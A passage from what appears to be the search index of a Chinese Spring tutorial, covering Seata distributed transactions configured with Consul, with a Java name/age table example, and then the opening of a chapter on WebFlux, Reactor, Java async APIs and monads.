\u4f5c\u4e3a\u670d\u52a1\u540d\u53bb\u627e\u3002 \u5982\u679c\u5168\u7528\u672c\u5730\u914d\u7f6e\uff0c\u5e94\u5f53\u8fd9\u6837\uff08type \u5b57\u6bb5\u9ed8\u8ba4\u90fd\u662f file\uff09\uff1a seata: registry: consul: server-addr: localhost:8500 tx-service-group: tx_group service: vgroup-mapping: tx_group: seata-group grouplist: seata-group: 127.0.0.1:8091 \u5bf9\u4e8e\u6211\u4eec\u4f7f\u7528 consul\uff0c\u5e94\u8be5\u8fd9\u6837\u914d\u7f6e\uff1a seata: config: type: consul consul: server-addr: localhost:8500 registry: type: consul consul: server-addr: localhost:8500 tx-service-group: tx_group \u800c service \u90e8\u5206\u5e94\u5f53\u8fdc\u7a0b\u914d\u7f6e\uff0c\u5373\u5728 Consul \u7684 KV \u4e2d\uff0c\u6211\u4eec\u4e4b\u524d\u7684 config \u53ea\u6dfb\u52a0\u4e86\u9ed8\u8ba4\u7684\u914d\u7f6e\uff0c\u73b0\u5728\u8981\u6dfb\u52a0\u8fd9\u4e9b\u5b57\u6bb5\uff1a service.vgroup-mapping.tx_group=seata-server \u8fd9\u91cc seata-server \u662f\u6211\u4eec\u7684\u670d\u52a1\u540d\uff0c\u5373\u4e4b\u524d\u914d\u7f6e\u7684 cluster \u3002 \u4f46\u662f\uff0c\u6ce8\u610f\uff0c\u76ee\u524d\u56e0\u4e3a\u6211\u4eec\u4f7f\u7528\u4e86 docker \u914d\u7f6e\uff0c\u6240\u4ee5\u6211\u8fd9\u91cc\u83b7\u53d6\u7684 seata \u5730\u5740\u662f 172.18.0.5:8091 \uff0c\u8fd9\u662f\u5bb9\u5668\u5185\u7684\u5730\u5740\u3002\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u5982\u679c\u4ea7\u54c1\u4e5f\u662f\u8fd0\u884c\u5728 docker \u73af\u5883\u4e2d\uff0c\u53ea\u8981\u8bbe\u7f6e exposed \u5c31\u53ef\u4ee5\u4e86\u3002\u4f46\u662f\u73b0\u5728\u6211\u4eec\u7684\u4ea7\u54c1\u662f\u8fd0\u884c\u5728\u672c\u5730\u7684\uff0c\u800c seata \u8fd0\u884c\u5728 docker \u5185\uff0c\u8981\u4e48\u8ba9 docker \u7f51\u7edc\u548c\u672c\u5730\u7f51\u7edc\u76f8\u8fde\uff0c\u8981\u4e48\u628a\u4e00\u6574\u5957\u8fc1\u79fb\u5230\u672c\u5730\u3002 \u56e0\u6b64\u4e3a\u4e86\u907f\u514d\u9ebb\u70e6\uff0c\u4e0b\u9762\u7684\u6f14\u793a\u4f7f\u7528 file \u6a21\u5f0f\u914d\u7f6e\u3002","title":"Client \u4e8b\u52a1\u5206\u7ec4\u4e0e\u914d\u7f6e"},{"location":"11/#_5","text":"\u7136\u540e\uff0cSeata \u9700\u8981\u4e00\u4e2a\u5355\u72ec\u7684\u6570\u636e\u5e93\uff0c\u7528\u4e8e\u4fdd\u5b58\u4e8b\u52a1\u4fe1\u606f\u3002\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u4ece Seata \u5b98\u65b9 \u4e0b\u8f7d \uff0c\u7136\u540e\u81ea\u884c\u5efa\u7acb\u4e00\u4e2a\u65b0\u7684\u540d\u4e3a seata \u7684\u6570\u636e\u5e93\uff0c\u5bfc\u5165\u8fd9\u4e2a\u6587\u4ef6\u3002 \u521b\u5efa\u4e4b\u540e\uff0c\u5e94\u8be5\u6709\u8fd9\u6837\u7684\u8868\uff1a \u4e4b\u540e\uff0c\u91cd\u65b0\u542f\u52a8 Seata \u670d\u52a1\uff0c\u4f1a\u6709\u4e00\u4e9b\u9519\u8bef\uff0c\u4f46\u662f\u6700\u540e\u4f1a\u6210\u529f\u542f\u52a8\u3002Seata \u9700\u8981\u4e00\u70b9\u65f6\u95f4\u4ece Consul \u8bfb\u53d6\u4fe1\u606f\u3002\u6700\u540e\uff0c\u547d\u4ee4\u884c\u4e0a\u4f1a\u8f93\u51fa web \u754c\u9762\u7684\u5730\u5740\uff0c\u8bbf\u95ee\u8fd9\u4e2a\u5730\u5740\uff0c\u53ef\u4ee5\u770b\u5230 Seata \u7684\u63a7\u5236\u53f0\u3002Consul \u4e2d\u4e5f\u4f1a\u6709 Seata \u670d\u52a1\u7684\u6ce8\u518c\u3002 \u8f93\u5165 application.yml \u91cc\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u754c\u9762\uff1a","title":"\u6570\u636e\u5e93\u914d\u7f6e"},{"location":"11/#seata_2","text":"\u4e3a\u4e86\u6d4b\u8bd5\uff0c\u6211\u4eec\u4eba\u4e3a\u6784\u9020\u4e00\u4e2a\u6ca1\u6709\u610f\u4e49\u7684\u4e8b\u52a1\u3002\u73b0\u5728\u521b\u5efa\u4e24\u4e2a\u6570\u636e\u8868\uff0c\u6bcf\u4e2a\u6570\u636e\u8868\u90fd\u6709\u4e00\u4e2a id\uff0c\u7b2c\u4e00\u4e2a\u6570\u636e\u8868\u6709\u4e00\u4e2a name\uff0c\u7b2c\u4e8c\u4e2a\u6570\u636e\u8868\u6709\u4e00\u4e2a age\u3002\u6211\u4eec\u8981\u4fdd\u8bc1\u8fd9\u4e24\u4e2a\u8868\u7684\u6570\u636e\u8981\u4e48\u540c\u65f6\u63d2\u5165\uff0c\u8981\u4e48\u540c\u65f6\u5220\u9664\u3002 CREATE TABLE name ( id SERIAL PRIMARY KEY, name TEXT ); CREATE TABLE age ( id SERIAL PRIMARY KEY, age INT ); \u7136\u540e\u521b\u5efa\u5bf9\u5e94\u7684 Repository \u548c Record\u3002\u56e0\u4e3a\u6211\u4eec\u8981\u6d4b\u8bd5\u7684\u573a\u666f\u662f\u5206\u5e03\u5f0f\u4e8b\u52a1\uff0c\u5373\u82e5\u5e72\u5fae\u670d\u52a1\u90fd\u64cd\u4f5c\u6570\u636e\u5e93\u3002 \u6211\u4eec\u5728\u4e4b\u524d\u7684\uff0c\u4f5c\u4e3a provider \u7684 payment \u670d\u52a1\u4e2d\uff0c\u63d0\u4f9b\u4e00\u4e2a\u65b0\u7684 API\uff0c\u8fd9\u4e2a API \u5e94\u5f53\u5411 name \u8868\u63d2\u5165\u6570\u636e\u3002 package io.github.fingerbone.entity; import jakarta.persistence.Column; import jakarta.persistence.Entity; import jakarta.persistence.GeneratedValue; import jakarta.persistence.GenerationType; import lombok.AllArgsConstructor; import lombok.Data; @Entity @Data @AllArgsConstructor public class Name { @Column @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; @Column private String name; } package io.github.fingerbone.repository; import org.springframework.data.jpa.repository.JpaRepository; import org.springframework.stereotype.Repository; import io.github.fingerbone.entity.Name; @Repository public interface NameRepository extends JpaRepository<Name, Long> { } package io.github.fingerbone.service; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import io.github.fingerbone.entity.Name; import io.github.fingerbone.repository.NameRepository; import lombok.RequiredArgsConstructor; @Service @RequiredArgsConstructor public class NameService { private final NameRepository nameRepository; public void createName(String name) { System.out.println(\"Will create name with name: \" + name); nameRepository.save( new Name(null, name) ); } } package io.github.fingerbone.controller; import io.github.fingerbone.entity.Payment; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.service.NameService; import io.github.fingerbone.service.PaymentService; import io.github.fingerbone.wrapper.ResponseWrapper; import lombok.RequiredArgsConstructor; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.DeleteMapping; import org.springframework.web.bind.annotation.PutMapping; import java.util.stream.Collectors; import java.util.List; @RestController @RequestMapping(\"/payment\") @RequiredArgsConstructor public class PaymentController { private final NameService nameService; @PostMapping(\"/name\") public void createName(@RequestParam String name) { nameService.createName(name); } } \u7136\u540e\u662f order \u670d\u52a1\uff0c\u8fd9\u4e2a\u670d\u52a1\u5e94\u5f53\u5411 age \u8868\u63d2\u5165\u6570\u636e\uff0c\u7136\u540e\u8bf7\u6c42 payment \u670d\u52a1\u63d2\u5165 name \u8868\u6570\u636e\u3002 @HttpExchange(\"http://payment-service/payment\") public interface PaymentAPIIf { @PostExchange(\"/name\") void createName(@RequestParam String name); } package io.github.fingerbone; import jakarta.persistence.Column; import jakarta.persistence.Entity; import jakarta.persistence.GeneratedValue; import jakarta.persistence.GenerationType; import lombok.AllArgsConstructor; import lombok.Data; @Entity @Data @AllArgsConstructor public class Age { @Id @Column @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; @Column private Short age; } package io.github.fingerbone; import org.springframework.data.jpa.repository.JpaRepository; import org.springframework.stereotype.Repository; @Repository public interface AgeRepository extends JpaRepository<Age, Long> { } package io.github.fingerbone; import org.springframework.stereotype.Service; import lombok.RequiredArgsConstructor; @Service @RequiredArgsConstructor public class AgeService { private final AgeRepository ageRepository; private final PaymentAPIIf paymentAPIIf; public void create(String name, Short age) { System.out.println(\"Will create age with name: \" + name + \" and age: \" + age); ageRepository.save( new Age(null, age) ); System.out.println(\"Will create name with name: \" + name); paymentAPIIf.createName(name); } } package io.github.fingerbone; import io.github.fingerbone.api.PaymentApi; import io.github.fingerbone.record.PaymentRecord; import io.github.fingerbone.wrapper.ResponseCode; import io.github.fingerbone.wrapper.ResponseWrapper; import io.github.resilience4j.bulkhead.annotation.Bulkhead; import io.github.resilience4j.circuitbreaker.annotation.CircuitBreaker; import lombok.Data; import lombok.RequiredArgsConstructor; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.http.HttpEntity; import org.springframework.http.ResponseEntity; import org.springframework.web.bind.annotation.*; import org.springframework.web.client.RestTemplate; import org.springframework.core.ParameterizedTypeReference; import org.springframework.http.HttpMethod; import java.util.List; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestBody; @RestController @RequestMapping(\"/if/payment\") @RequiredArgsConstructor public class ConsumerPaymentController { private final AgeService ageService; @PostMapping(\"/age\") public void createAge(@RequestParam String name, @RequestParam Short age) { ageService.create(name, age); } } \u73b0\u5728\uff0c\u542f\u52a8\u4e24\u4e2a\u670d\u52a1\uff0c\u8fdb\u884c\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u53d1\u73b0 name \u8868\u4e0e age \u8868\u53ef\u4ee5\u88ab\u6b63\u786e\u64cd\u4f5c\u4e86\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5e0c\u671b\u63d2\u5165 name \u548c age \u4f5c\u4e3a\u540c\u4e00\u4e2a\u4e8b\u52a1\uff0c\u5373\u8981\u4e48\u540c\u65f6\u63d2\u5165\uff0c\u8981\u4e48\u540c\u65f6\u5220\u9664\u3002\u4e24\u4e2a\u5fae\u670d\u52a1\u7684\u4e24\u4e2a Service \u4f5c\u4e3a\u540c\u4e00\u4e2a\u4e8b\u52a1\u8fdb\u884c\u5904\u7406\u3002 \u53c2\u8003 Seata \u7684 \u6587\u6863 \uff0c\u5728 AT \u6a21\u5f0f\u4e0b\uff0c\u9700\u8981\u5728\u9700\u8981\u4e8b\u52a1\u64cd\u4f5c\u7684\u6570\u636e\u5e93\u4e2d\u521b\u5efa\u4e00\u4e2a undo_log \u8868\u3002\u811a\u672c\u5728 \u8fd9\u91cc \u3002 \u8981\u4f7f\u7528 Seata\uff0c\u53ea\u9700\u8981\u4e3a TM \u65b9\u6cd5\u52a0\u4e0a @GlobalTransactional \u6ce8\u89e3\u5373\u53ef\uff0c\u5373\u6574\u4e2a\u5fae\u670d\u52a1\u8c03\u7528\u94fe\u7684\u53d1\u8d77\u65b9\u6cd5\u3002 @GlobalTransactional(name = \"createUser\", timeoutMills = 10000, rollbackFor = Exception.class) \u73b0\u5728\uff0c\u5982\u679c\u5728\u88ab\u8c03\u5fae\u670d\u52a1\u4e2d\u624b\u52a8\u89e6\u53d1\u5f02\u5e38\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u5c3d\u7ba1\u547d\u4ee4\u884c\u4e2d\u8f93\u51fa\u4e86\u63d2\u5165\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u4f46\u6570\u636e\u5e93\u91cc\u5e76\u6ca1\u6709\u4fe1\u606f\uff0c\u8bf4\u660e\u89e6\u53d1\u4e86 Rollback\uff0c\u547d\u4ee4\u884c\u4e0a\u4e5f\u6709\u76f8\u5173\u7684\u8f93\u51fa\u3002 \u5728 Seata \u7684\u63a7\u5236\u53f0\u4e0a\uff0c\u4e5f\u6709\u76f8\u5173\u8bb0\u5f55\u3002","title":"Seata \u7684\u4f7f\u7528"},{"location":"12/","text":"Spring \u901f\u6210 Ch12 Reactor Spring Cloud \u5fae\u670d\u52a1\u7684\u5185\u5bb9\u544a\u4e00\u6bb5\u843d\u3002\u5728 Spring Cloud \u90e8\u5206\uff0c\u6211\u4eec\u5b66\u4e60\u4e86\u4f7f\u7528 Consul\uff0cLoad Balancer\uff0cSpring Interface Client \u4e0e OpenFeign\uff0cResilience4j\uff0cMicroMeter\uff0cGateway\uff0cSeata\u3002\u8fd9\u662f\u73b0\u5728 Spring Cloud \u5b98\u65b9\u6700\u63a8\u8350\u7684\u4e00\u5957\u7ec4\u4ef6\u3002\u8bda\u7136\uff0c\u8fd8\u6709\u5176\u5b83\u4e00\u4e9b\u7ec4\u4ef6\u4e5f\u5f88\u91cd\u8981\uff0c\u4e3b\u8981\u662f Spring Cloud Alibaba \u7684\u7ec4\u4ef6\uff0cNacos \u4e0e Sentinel\uff0cSeata \u4e5f\u5c5e\u4e8e Spring Cloud Alibaba \u7684\u7ec4\u4ef6\uff0c\u4f46\u662f\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u5b83\u3002Nacos \u548c Sentinel \u7684\u4f7f\u7528\u65b9\u6cd5\u4e0e Consul \u548c Resilience4j \u7c7b\u4f3c\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u518d\u4ecb\u7ecd\uff0c\u6709\u4e86\u524d\u9762\u7684\u57fa\u7840\uff0c\u4f60\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5b66\u4e60\u5b83\u4eec\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5c06\u5b66\u4e60\u4e00\u4e9b Spring \u7684\u9ad8\u7ea7\u5185\u5bb9\uff0c\u4e4b\u540e\u518d\u56de\u5230\u5fae\u670d\u52a1\uff0c\u5b66\u4e60\u57fa\u4e8e kubernetes \u7684\u5fae\u670d\u52a1\u3002 \u8fd9\u4e9b\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\uff0c WebFlux\uff0c\u5f02\u6b65\u7684 Spring Web Spring Security\uff0cSpring \u5b89\u5168\u6846\u67b6\uff1bKeyCloak\uff0cOIDC \u8ba4\u8bc1\u670d\u52a1\u5668 \u6d88\u606f\u961f\u5217\uff0cRabbit MQ \u975e HTTP \u534f\u8bae\uff0c\u5305\u62ec graphQL \u548c RPC\uff0cRPC \u5c06\u57fa\u4e8e gRPC \u8fdb\u884c\u4ecb\u7ecd \u9996\u5148\uff0c\u6211\u4eec\u5b66\u4e60 WebFlux\u3002Spring \u6846\u67b6\u6211\u4eec\u4e4b\u524d\u5df2\u7ecf\u5b66\u8fc7\uff0c\u56e0\u6b64\u6211\u4eec\u91cd\u70b9\u5b66\u4e60 Reactor\uff0c\u5b83\u662f WebFlux \u7684\u57fa\u7840\u3002 WebFlux \u7b80\u4ecb \u524d\u9762\u6211\u4eec\u8bb2\u8fc7\uff0cSpring \u81ea\u5df1\u662f\u4e00\u4e2a\u57fa\u4e8e Bean \u7684\u6846\u67b6\u3002\u800c Spring Web \u662f\u6211\u4eec\u5b9e\u9645\u5f00\u53d1 Web \u7a0b\u5e8f\u4f7f\u7528\u7684\u6846\u67b6\uff0c\u5b83\u662f\u4e2a\u57fa\u4e8e Servlet \u548c Spring \u7684\u6846\u67b6\uff0c\u5b83\u6709\u81ea\u5df1\u7684 Spring Boot Starter\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u4f7f\u7528\u3002 \u5176\u5b9e\uff0cSpring Web \u7684\u5168\u540d\u662f Spring Web MVC\uff0c\u4f46 MVC \u5df2\u7ecf\u6ca1\u4eba\u5173\u5fc3\u4e86\u3002 \u4f46\u662f\uff0c\u4e0e Spring Web \u5e76\u884c\u7684\u8fd8\u6709\u4e00\u5957\u6846\u67b6\uff0c\u53eb\u505a Spring WebFlux\u3002Spring WebFlux \u662f\u4e00\u4e2a\u57fa\u4e8e Reactor \u7684\u6846\u67b6\uff0c\u5b83\u662f\u4e00\u4e2a\u5f02\u6b65\u7684\u6846\u67b6\uff0c\u53ef\u4ee5\u7528\u4e8e\u6784\u5efa\u54cd\u5e94\u5f0f\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u4e5f\u662f\u57fa\u4e8e Spring \u5bb9\u5668\uff0c\u4f46\u662f\u5b83\u7684\u5f02\u6b65\u5f15\u64ce\u662f Reactor\uff0c\u800c\u670d\u52a1\u5668\u662f Netty\u3002Reactor \u4e3a WebFlux \u63d0\u4f9b\u4e86\u5f02\u6b65\u7684\u80fd\u529b\uff0cNetty \u4e3a WebFlux \u63d0\u4f9b\u4e86\u5f02\u6b65\u7684\u670d\u52a1\u5668\u3002 \u76f8\u6bd4\u4e8e Spring Web\uff0cSpring WebFlux \u6709\u66f4\u9ad8\u7684\u5e76\u53d1\u80fd\u529b\u3002\u7136\u800c\uff0c\u7531\u4e8e WebFlux \u8f83\u4e3a\u5e74\u8f7b\uff0cSpring \u7684\u6574\u4e2a\u751f\u6001\u90fd\u662f\u56f4\u7ed5 Spring Web \u7684\uff0c\u6240\u4ee5 Spring WebFlux \u53ef\u80fd\u4f1a\u9047\u5230\u4e00\u4e9b\u4e0d\u517c\u5bb9\u95ee\u9898\uff0c\u4f46\u5e76\u4e0d\u4e25\u91cd\u3002\u4f46\u6574\u4f53\u800c\u8a00\uff0c\u5750\u62e5\u6574\u4e2a Spring \u751f\u6001\u7684 Spring WebFlux \u662f\u4e00\u4e2a\u5f88\u6709\u524d\u9014\u7684\u6846\u67b6\u3002 Java \u6807\u51c6\u5e93\u5f02\u6b65\u7f16\u7a0b \u6211\u4eec\u5148\u770b\u4e3a\u4ec0\u4e48\u8981\u5f15\u5165 Reactor\u3002 Java \u5728 8 \u4e4b\u540e\u5f15\u5165\u4e86 Future\uff0c\u4f46\u662f Future \u8bbe\u8ba1\u7684\u592a\u5dee\u4e86\uff0c\u4ee5\u81f3\u4e8e\u4f60\u5fc5\u987b\u624b\u52a8\u5b9e\u73b0 EventLoop\uff0c\u4f8b\u5982\uff0c ExecutorService executor = Executors.newFixedThreadPool(1); Future<Integer> future = executor.submit(() -> { Thread.sleep(1000); return 1; }); while (!future.isDone()) { System.out.println(\"Waiting...\"); Thread.sleep(100); } System.out.println(future.get()); \u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u7cdf\u7cd5\u7684\u8bbe\u8ba1\u56e0\u6b64\uff0cJava \u5728 8 \u4e4b\u540e\u5f15\u5165\u4e86 CompletableFuture\uff0c\u5b83\u6bd4 Future \u597d\u7528\u591a\u4e86\uff0c\u4f8b\u5982\uff0c CompletableFuture<Integer> future = CompletableFuture.supplyAsync(() -> { try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } return 1; }); future.thenAccept(System.out::println); \u663e\u7136\uff0c\u8fd9\u4e2a\u5df2\u7ecf\u5f88\u50cf\u5176\u5b83\u8bed\u8a00\u7684 Promise \u4e86\u3002\u4f46\u662f\u5f88\u53ef\u60dc\uff0cJava \u81f3\u4eca\u8fd8\u6ca1\u6709\u5f15\u5165 async-await\uff0c\u56e0\u6b64\u7ecf\u5178\u7684\u56de\u8c03\u5730\u72f1\u8fd8\u662f\u4f1a\u51fa\u73b0\u3002 \u4e0d\u8fc7\uff0c\u56de\u8c03\u5730\u72f1\u4e0d\u53ea\u6709\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\uff0c\u9664\u4e86\u5927\u90e8\u5206\u8bed\u8a00\u91c7\u7528\u7684 async-await\uff0c\u8fd8\u6709\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\uff0c\u5c31\u662f\u54cd\u5e94\u5f0f\u7f16\u7a0b\uff0c\u8fd9\u5c31\u662f Reactor\u3002 \u4e0d\u8fc7\uff0cJava \u5728\u540e\u7eed\u7684 Java 9 \u4e4b\u540e\u5f15\u5165\u4e86 Flow\uff0c\u5b83\u8bbe\u8ba1\u7684\u548c Reactor \u7c7b\u4f3c\u3002\u5177\u4f53\u800c\u8a00\uff0c\u5b83\u7684\u6548\u679c\u662f\uff0c Flow.Publisher<Integer> publisher = subscriber -> { subscriber.onNext(1); subscriber.onComplete(); }; Flow.Subscriber<Integer> subscriber = new Flow.Subscriber<>() { @Override public void onSubscribe(Flow.Subscription subscription) { subscription.request(1); } @Override public void onNext(Integer item) { System.out.println(item); } @Override public void onError(Throwable throwable) { throwable.printStackTrace(); } @Override public void onComplete() { System.out.println(\"Complete\"); } }; publisher.subscribe(subscriber); \u591a\u5c11\u6709\u70b9\u592a\u5570\u55e6\u4e86\u3002\u800c Reactor \u5229\u7528\u51fd\u6570\u5f0f\u7f16\u7a0b\u7684\u7279\u6027\uff0c\u53ef\u4ee5\u66f4\u7b80\u5355\u7684\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u50cf\u662f\uff0c Flux.just(1).subscribe(System.out::println); \u8981\u7b80\u5355\u5f97\u591a\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u5c3d\u7ba1\u6709\u4e86 Flow\uff0c\u4f46\u662f Reactor \u4ecd\u7136\u6709\u5e02\u573a\u3002 \u54cd\u5e94\u5f0f\u7f16\u7a0b\u7684\u6838\u5fc3\u6982\u5ff5 \u54cd\u5e94\u5f0f\u7f16\u7a0b\u672c\u8d28\u5c31\u662f\u7ecf\u5178\u7684\u6d41\u5f0f\u7f16\u7a0b\uff0c\u4f46\u662f\u5b83\u4e0e\u4f20\u7edf\u7684\u6d41\u5f0f\u7f16\u7a0b\u6709\u4e00\u4e9b\u4e0d\u540c\u3002 \u54cd\u5e94\u5f0f\u7f16\u7a0b\u662f\u5f02\u6b65\u7684\uff0c\u800c\u4e0d\u662f\u540c\u6b65\u7684\u3002\u8fd9\u610f\u5473\u7740\u4f60\u53ef\u4ee5\u5728\u7b49\u5f85\u4e00\u4e2a\u64cd\u4f5c\u5b8c\u6210\u7684\u65f6\u5019\u505a\u5176\u5b83\u4e8b\u60c5\u3002\u800c\u5728\u6d41\u5f0f\u7f16\u7a0b\u4e2d\uff0c\u672c\u8d28\u53ea\u662f\u4e00\u4e2a\u5faa\u73af\u3002 \u54cd\u5e94\u5f0f\u7f16\u7a0b\u662f\u57fa\u4e8e\u4e8b\u4ef6\u7684\uff0c\u800c\u4e0d\u662f\u57fa\u4e8e\u6570\u636e\u7684\u3002\u8fd9\u610f\u5473\u7740\u4f60\u53ef\u4ee5\u5728\u6570\u636e\u5230\u8fbe\u7684\u65f6\u5019\u5904\u7406\u6570\u636e\uff0c\u800c\u4e0d\u662f\u7b49\u5f85\u6570\u636e\u5230\u8fbe\u3002 \u54cd\u5e94\u5f0f\u7f16\u7a0b\u662f\u60f0\u6027\u7684\uff0c\u800c\u4e0d\u662f\u53ca\u65f6\u7684\u3002\u8fd9\u610f\u5473\u7740\u4f60\u53ef\u4ee5\u5728\u9700\u8981\u7684\u65f6\u5019\u624d\u5904\u7406\u6570\u636e\uff0c\u800c\u4e0d\u662f\u4e00\u6b21\u6027\u5904\u7406\u6240\u6709\u6570\u636e\u3002 \u54cd\u5e94\u5f0f\u7f16\u7a0b\u6709\u4e24\u4e2a\u6838\u5fc3\u6982\u5ff5\uff0c\u4e00\u4e2a\u662f Publisher\uff0c\u4e00\u4e2a\u662f Subscriber\u3002\u4e24\u8005\u5728 Reactor \u4e2d\u90fd\u662f Mono \u548c Flux\uff0c\u800c\u8fd9\u4e24\u4e2a\u4e1c\u897f\u672c\u8d28\u4e0a\u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u4e2d\u7684 Monad\u3002 \u4e0b\u9762\u5173\u4e8e Monad \u7684\u5185\u5bb9\uff0c\u5982\u679c\u4e0d\u7406\u89e3\u53ef\u4ee5\u8df3\u8fc7\uff0c\u4e0d\u5f71\u54cd\u5de5\u7a0b\u4e0a\u7684\u77e5\u8bc6\u548c\u4f7f\u7528\u3002 Monad Monad \u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u4e2d\u7684\u4e00\u4e2a\u6982\u5ff5\u3002\u5c3d\u7ba1\u6709\u4e9b\u6559\u7a0b\u5199\u7684\u5f88\u590d\u6742\uff0c\u4f46\u662f\u5176\u5b9e\u5f88\u7b80\u5355\u3002Monad \u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u6620\u5c04\u3002\u6211\u4eec\u7528\u4e24\u4e2a\u7a7a\u95f4\u6765\u8be0\u91ca Monad\uff0c\u771f\u503c\u7a7a\u95f4\u548c\u50cf\u7a7a\u95f4\u3002\u771f\u503c\u7a7a\u95f4\u662f\u6211\u4eec\u719f\u6089\u7684\u7a7a\u95f4\uff0c\u5b83\u5305\u542b\u4e86\u6240\u6709\u7684\u771f\u503c\u3002\u800c\u50cf\u7a7a\u95f4\u662f Monad \u7684\u7a7a\u95f4\uff0c\u5b83\u5305\u542b\u4e86 Monad \u7684\u503c\u3002 Monad \u662f\u4e00\u4e2a\u5305\u542b\u4e09\u4e2a\u5173\u952e\u8981\u7d20\u7684\u7ed3\u6784\uff1a \u7c7b\u578b\u6784\u9020\u5668\uff08Type Constructor\uff09\uff1a\u5c06\u666e\u901a\u7684\u503c\uff08\u771f\u503c\uff09\u6620\u5c04\u5230\u50cf\u7a7a\u95f4\u4e2d\u3002\u8fd9\u7c7b\u4f3c\u4e8e\u5728 Java \u4e2d\u7684\u6cdb\u578b\u7c7b\u578b\uff0c\u5982 Optional<T> \uff0c\u5b83\u5c06\u4e00\u4e2a\u503c\u5305\u88f9\u5728\u4e00\u4e2a\u5bb9\u5668\u5185\u3002\u7c7b\u578b\u6784\u9020\u5668\u672c\u8d28\u4e0a\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b0\u7684\u6570\u636e\u7c7b\u578b\uff0c\u8fd9\u4e2a\u7c7b\u578b\u5305\u542b\u4e86\u539f\u59cb\u503c\u53ca\u5176\u9644\u52a0\u7684\u8ba1\u7b97\u4e0a\u4e0b\u6587\u3002 unit\uff08\u4e5f\u79f0\u4e3a return \u6216 pure\uff09\uff1a\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u4e8e\u5c06\u771f\u503c\u7a7a\u95f4\u4e2d\u7684\u5143\u7d20\u8f6c\u6362\u4e3a\u50cf\u7a7a\u95f4\u4e2d\u7684 Monad\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b83\u5c06\u666e\u901a\u7684\u503c\u653e\u5165 Monad \u4e2d\u3002\u4f8b\u5982\uff0c\u5728 Optional \u4e2d\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 Optional.of \u6765\u5c06\u4e00\u4e2a\u503c\u653e\u5165 Optional Monad \u4e2d\u3002 bind\uff08\u4e5f\u79f0\u4e3a flatMap\uff0c\u6216 >>= \uff09\uff1a\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u4e8e\u5bf9\u50cf\u7a7a\u95f4\u4e2d\u7684 Monad \u8fdb\u884c\u64cd\u4f5c\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0cMonad \u5148\u628a\u67d0\u4e2a\u503c\u6253\u5305\uff0c\u7136\u540e\u5bf9\u8fd9\u4e2a\u6253\u5305\u597d\u7684\u503c\u8fdb\u884c\u8fd0\u7b97\uff0c\u7136\u540e\u518d\u53d6\u51fa\u6765\u3002\u8fd9\u4e2a\u6253\u5305\u597d\u7684\u503c\u5c31\u662f\u50cf\u7a7a\u95f4\u4e2d\u7684 Monad\u3002 \u8fd9\u79cd\u64cd\u4f5c\u770b\u8d77\u6765\u53ef\u80fd\u6ca1\u6709\u4ec0\u4e48\u610f\u4e49\uff0c\u4f46\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u53ef\u80fd\u4f1a\u8ba9\u4f60\u660e\u767d\u5b83\u7684\u65b9\u4fbf\u4e4b\u5904\u3002\u5373\u6709\u65f6\u5019\uff0c\u771f\u503c\u7a7a\u95f4\u5185\u7684\u8fd0\u7b97\u53ef\u80fd\u6ca1\u6709\u5168\u5c40\u7684\u7b97\u5b50\uff0c\u5373\u6ca1\u6709\u5168\u5c40\u7684\u51fd\u6570\u6765\u5904\u7406\u6240\u6709\u60c5\u51b5\u3002\u8fd8\u4f7f\u7528 Optional \u4e3a\u4f8b\u5b50\uff0c\u4f8b\u5982\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6570\u5b57\uff0c\u4f60\u60f3\u8981\u5bf9\u8fd9\u4e2a\u6570\u5b57\u5f00\u6839\u53f7\uff0c\u4f46\u662f\u7528\u6237\u53ef\u80fd\u8f93\u5165\u4e86\u8d1f\u6570\uff0c\u6216\u8005\u662f\u7a7a\u503c\u3002\u8fd9\u65f6\u5019\uff0c\u4f60\u5c31\u9700\u8981\u5bf9\u8fd9\u4e2a\u6570\u5b57\u8fdb\u884c\u68c0\u67e5\uff0c\u7136\u540e\u518d\u8fdb\u884c\u5f00\u6839\u53f7\u3002\u8fd9\u4e2a\u68c0\u67e5\u7684\u8fc7\u7a0b\u5c31\u662f Monad \u7684 bind 